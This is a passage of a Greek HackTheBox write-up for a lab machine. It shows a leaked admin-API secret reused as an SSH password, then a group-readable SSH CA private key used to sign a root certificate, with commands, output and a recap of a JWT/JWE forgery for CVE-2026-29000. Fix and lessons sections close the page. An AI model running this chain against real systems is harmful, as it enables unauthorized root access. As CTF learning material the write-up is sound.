+  <div class="alert alert-warn"><strong>Η διαρροή:</strong> ένα endpoint ρυθμίσεων μόνο-για-admin επιστρέφει ένα ζωντανό μυστικό σε καθαρό κείμενο, με ετικέτα <code>encryptionKey</code>. Η τιμή διαβάζεται σαν passphrase ανάπτυξης — και η ίδια απόκριση του <code>/api/settings</code> διαφημίζει ότι η υποδομή χρησιμοποιεί αυθεντικοποίηση με πιστοποιητικά SSH με μια CA κάτω από το <code>/opt/principal/ssh/</code>, ενώ το <code>/api/users</code> εμφανίζει έναν λογαριασμό υπηρεσίας <code>svc-deploy</code> «για αυτοματοποιημένες αναπτύξεις μέσω SSH certificate auth». Δύο μισά της ίδιας υπόδειξης.</div>
+
+  <!-- ══ USER ══ -->
+  <h2>Χρήστης — ένας διαρρέων κωδικός, επαναχρησιμοποιημένος για SSH</h2>
+
+  <p>Το μυστικό που διέρρευσε δεν σχετίζεται καθόλου με την κρυπτογραφία· επαναχρησιμοποιείται ως κωδικός SSH. Δοκιμασμένο (spray) στα usernames που μας έδωσε ήδη η λίστα του <code>/api/users</code>, πετυχαίνει στον λογαριασμό υπηρεσίας ανάπτυξης:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">user.txt</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">sshpass -p '&lt;μυστικό που διέρρευσε&gt;' ssh svc-deploy@&lt;target&gt; 'id; cat user.txt'</span>
+<span class="pg">uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
+[λογοκριμένο — user flag]</span></div>
+  </div>
+
+  <p>Πρόσεξε το δεύτερο group: <code>deployers</code>. Δεν είναι διακοσμητικό — είναι ολόκληρο το μονοπάτι κλιμάκωσης προνομίων.</p>
+
+  <!-- ══ PRIVESC ══ -->
+  <h2>Root — ένα ιδιωτικό κλειδί CA που επιτρέπεται να διαβάσεις</h2>
+
+  <p>Το endpoint ρυθμίσεων έδειξε προς το <code>/opt/principal/ssh/</code>, και το ίδιο του το README εξηγεί τι ζει εκεί: μια RSA αρχή πιστοποίησης (CA) που ο <code>sshd</code> εμπιστεύεται για logins βασισμένα σε πιστοποιητικά. Ο φάκελος ανήκει στο <code>root:deployers</code> και είναι αναγνώσιμος από το group — και ο <code>svc-deploy</code> ανήκει στο <code>deployers</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">η CA, αναγνώσιμη μέσω του group deployers</span></div>
+    <div class="term-body"><span class="pd">svc-deploy@principal:~$ </span><span class="pc">ls -l /opt/principal/ssh/</span>
+<span class="po">-rw-r----- 1 root deployers  288 README.txt
+</span><span class="pg">-rw-r----- 1 root deployers 3381 ca</span><span class="po">        </span><span class="pco"># ιδιωτικό κλειδί CA — αναγνώσιμο από το group</span><span class="po">
+-rw-r--r-- 1 root deployers  742 ca.pub</span>
+<span class="pd">svc-deploy@principal:~$ </span><span class="pc">grep -ri trustedusercakeys /etc/ssh/</span>
+<span class="py">/etc/ssh/sshd_config.d/60-principal.conf:TrustedUserCAKeys /opt/principal/ssh/ca.pub</span></div>
+  </div>
+
+  <p>Αυτή η μία οδηγία του <code>sshd</code> είναι το παν. Το <code>TrustedUserCAKeys</code> λέει στον daemon να δέχεται <em>οποιοδήποτε</em> πιστοποιητικό χρήστη υπογεγραμμένο από εκείνη τη CA — το πιστοποιητικό <em>είναι</em> η εξουσιοδότηση. Άρα ένα ιδιωτικό κλειδί CA που μπορείς να διαβάσεις δεν είναι «ένα κλειδί στο μηχάνημα»· είναι η εξουσία να εκδώσεις στον εαυτό σου μια έγκυρη ταυτότητα για οποιονδήποτε λογαριασμό, μαζί και τον root. Δεν υπάρχει exploit να γραφτεί. Απλώς χρησιμοποιείς τη CA όπως χτίστηκε για να χρησιμοποιείται, αλλά για ένα principal που ποτέ δεν προοριζόταν να υπογράψει.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">υπόγραψε πιστοποιητικό root, μπες ως root</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc"># τράβα κάτω το ιδιωτικό κλειδί CA (αναγνώσιμο ως svc-deploy), υπόγραψε το δικό μας κλειδί για root</span>
+<span class="pd">$ </span><span class="pc">ssh-keygen -t ed25519 -N '' -f rootkey</span>
+<span class="pd">$ </span><span class="pc">ssh-keygen -s ca -I pwn-root -n root -V +2h rootkey.pub</span>
+<span class="pg">Signed user key rootkey-cert.pub: id "pwn-root" serial 0 for root valid ...</span>
+<span class="pd">$ </span><span class="pc">ssh -i rootkey -o CertificateFile=rootkey-cert.pub root@&lt;target&gt; 'id; cat /root/root.txt'</span>
+<span class="pg">uid=0(root) gid=0(root) groups=0(root)
+[λογοκριμένο — root flag]</span></div>
+  </div>
+
+  <div class="alert alert-warn"><strong>Η λεπτομέρεια του <code>-n root</code>:</strong> αυτός ο <code>sshd</code> δεν θέτει <code>AuthorizedPrincipalsFile</code>, οπότε ισχύει ο προεπιλεγμένος κανόνας — η λίστα principals του πιστοποιητικού πρέπει να περιέχει το username εισόδου. Υπόγραψε με <code>-n root</code> ώστε το πιστοποιητικό να είναι έγκυρο για τον λογαριασμό <code>root</code>· παρέλειψέ το και η είσοδος απορρίπτεται παρότι η ίδια η υπογραφή της CA είναι απολύτως έγκυρη. Είναι η διαφορά ανάμεσα σε ένα σωστά-υπογεγραμμένο πιστοποιητικό και σε ένα πιστοποιητικό <em>σωστά-υπογεγραμμένο για τον λογαριασμό που χρησιμοποιείς</em>.</div>
+
+  <!-- ══ RECAP ══ -->
+  <h2>Όλη η αλυσίδα, σε μία οθόνη</h2>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">σύνοψη</span></div>
+    <div class="term-body"><span class="pco"># 1. το header κατονομάζει τον στόχο: X-Powered-By: pac4j-jwt/6.0.3 ; το κλειδί JWKS είναι δημόσιο</span>
+<span class="pc">curl -s http://&lt;target&gt;:8080/api/auth/jwks</span>
+
+<span class="pco"># 2. CVE-2026-29000: το JWE αποκρυπτογραφείται αλλά η εσωτερική υπογραφή δεν επαληθεύεται ποτέ</span>
+<span class="pco">#    φτιάξε alg:none JWT{role:ROLE_ADMIN}, κρυπτογράφησέ το προς το δημόσιο κλειδί, στείλ' το ως Bearer</span>
+<span class="pc">python3 forge.py  # -> RSA-OAEP-256 + A128GCM JWE</span>
+
+<span class="pco"># 3. το admin /api/settings διαρρέει μυστικό σε καθαρό κείμενο -> επαναχρήση ως κωδικός SSH</span>
+<span class="pc">sshpass -p '&lt;leaked&gt;' ssh svc-deploy@&lt;target&gt;   # user.txt ; group: deployers</span>
+
+<span class="pco"># 4. το group deployers μπορεί να διαβάσει το ιδιωτικό κλειδί CA του TrustedUserCAKeys</span>
+<span class="pc">ssh-keygen -s ca -I x -n root -V +2h rootkey.pub</span>
+<span class="pc">ssh -i rootkey -o CertificateFile=rootkey-cert.pub root@&lt;target&gt;   # root.txt</span></div>
+  </div>
+
+  <!-- ══ FIX ══ -->
+  <h2>Η διόρθωση</h2>
+
+  <p>Κάθε κρίκος της αλυσίδας έχει μια συγκεκριμένη διόρθωση μιας γραμμής — και είναι ανεξάρτητοι, οπότε άμυνα σε βάθος σημαίνει να διορθώσεις όλους, όχι μόνο το CVE:</p>
+
+  <ul>
+    <li><strong>Επίβαλε την εσωτερική υπογραφή.</strong> Ρύθμισε τον <code>JwtAuthenticator</code> του pac4j με ένα υποχρεωτικό <code>SignatureConfiguration</code> και απόρριψε οποιοδήποτε εσωτερικό <code>PlainJWT</code> / <code>alg:none</code>. Η αποκρυπτογράφηση δεν πρέπει ποτέ να υποκαθιστά την επαλήθευση υπογραφής — απαντούν σε διαφορετικά ερωτήματα (εμπιστευτικότητα vs. αυθεντικότητα). Η αναβάθμιση πέρα από τη διόρθωση του CVE-2026-29000 στο pac4j-jwt κλείνει το μονοπάτι αποδοχής ανυπόγραφων.</li>
+    <li><strong>Επικύρωσε τα claims, όχι μόνο το wrapper.</strong> Έλεγξε <code>iss</code>, <code>exp</code>, και ένα αναμενόμενο audience στην πλευρά του server, ώστε ένα πλαστό token να μην μπορεί απλώς να δηλώνει <code>ROLE_ADMIN</code> για πάντα.</li>
+    <li><strong>Ποτέ μην επιστρέφεις μυστικό από ένα API.</strong> Το <code>/api/settings</code> δεν πρέπει να περιλαμβάνει το <code>encryptionKey</code> — ή οποιοδήποτε credential — στο σώμα της απόκρισής του, για <em>κανέναν</em> ρόλο. Τη στιγμή που μια τιμή περνά σε έναν client, θεώρησέ την διαρρευσμένη.</li>
+    <li><strong>Κλείδωσε το κλειδί CA στον root.</strong> Ένα κλειδί υπογραφής <code>TrustedUserCAKeys</code> είναι ισοδύναμο του root· πρέπει να είναι <code>0400 root:root</code>, ποτέ <code>0440 root:deployers</code>. Η αναγνωσιμότητα από group παρέδωσε ολόκληρο το μηχάνημα σε οποιονδήποτε στο <code>deployers</code>.</li>
+  </ul>
+
+  <!-- ══ LESSONS ══ -->
+  <h2>Μαθήματα</h2>
+
+  <ul>
+    <li><strong>Η κρυπτογράφηση είναι εμπιστευτικότητα, όχι αυθεντικότητα.</strong> Ένα JWE αποδεικνύει ότι ο αποστολέας είχε ένα <em>δημόσιο</em> κλειδί — που είναι δημόσιο εξ ορισμού. Δεν λέει τίποτα για το ποιος εξέδωσε τα claims. Η αυθεντικότητα ζει στην εσωτερική υπογραφή, και πρέπει να επαληθεύεται ως δικό της βήμα. Παρέλειψέ το και ένα «κρυπτογραφημένο» token είναι ένα token που μπορεί να γράψει ο καθένας. Αυτό είναι όλο το CVE-2026-29000.</li>
+    <li><strong>Ένα δημοσιευμένο κλειδί είναι και κλειδί του επιτιθέμενου.</strong> Το endpoint JWKS υπάρχει ώστε οι clients να επαληθεύουν tokens, αλλά το ίδιο δημόσιο κλειδί είναι ακριβώς αυτό που χρειάζεσαι για να <em>κρυπτογραφήσεις</em> ένα πλαστό. Το να δημοσιεύεις ένα κλειδί είναι εντάξει· το να βασίζεσαι στην κατοχή ενός δημόσιου κλειδιού σαν να ήταν απόδειξη ταυτότητας δεν είναι.</li>
+    <li><strong>Τα μυστικά δεν ανήκουν σε μια απόκριση API, ούτε καν σε μία μόνο-για-admin.</strong> Εδώ το «μόνο-για-admin» απείχε ένα πλαστό claim — αλλά ακόμη και ένας τέλεια αυθεντικοποιημένος admin δεν πρέπει ποτέ να παίρνει ένα ζωντανό credential σε καθαρό κείμενο. Τη στιγμή που μια τιμή επιστρέφεται σε έναν client, θεώρησέ την διαρρευσμένη.</li>
+    <li><strong>Ένα ιδιωτικό κλειδί SSH CA είναι μυστικό ισοδύναμο του root.</strong> Με το <code>TrustedUserCAKeys</code>, το πιστοποιητικό είναι η εξουσιοδότηση· όποιος μπορεί να διαβάσει το κλειδί CA μπορεί να εκδώσει οποιαδήποτε ταυτότητα δέχεται ο <code>sshd</code>, μαζί και τον root. Πρέπει να προστατεύεται τουλάχιστον όσο τα ίδια τα credentials του root — ένα κλειδί CA αναγνώσιμο από group παραδίδει το μηχάνημα στο group.</li>
+  </ul>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">Το προφίλ μου στο HTB &amp; περισσότερα boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Εργαλεία security &amp; automation ανοιχτού κώδικα</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← Ολα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
